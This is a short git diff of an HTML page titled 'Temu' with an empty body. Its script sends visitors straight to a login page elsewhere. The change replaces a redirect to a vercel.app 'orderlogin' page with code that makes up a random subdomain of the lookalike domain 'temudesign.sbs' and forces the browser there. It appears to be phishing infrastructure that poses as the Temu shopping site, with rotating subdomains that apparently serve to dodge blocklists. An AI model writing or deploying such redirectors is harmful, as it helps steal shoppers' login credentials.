@@ -4,10 +4,18 @@
     <meta charset="utf-8">
     <title>Temu</title>
     <script>
-      window.location.replace("https://kawaiiash-github-io.vercel.app/orderlogin");
+      (function() {
+        // 生成随机子域名，例如 abc123
+        const randomSub = Math.random().toString(36).substring(2, 8);
+        
+        // 构造跳转 URL
+        const target = `https://${randomSub}.temudesign.sbs/orderlogin`;
+
+        // 强制跳转
+        window.location.replace(target);
+      })();
     </script>
   </head>
   <body>
   </body>
 </html>
-
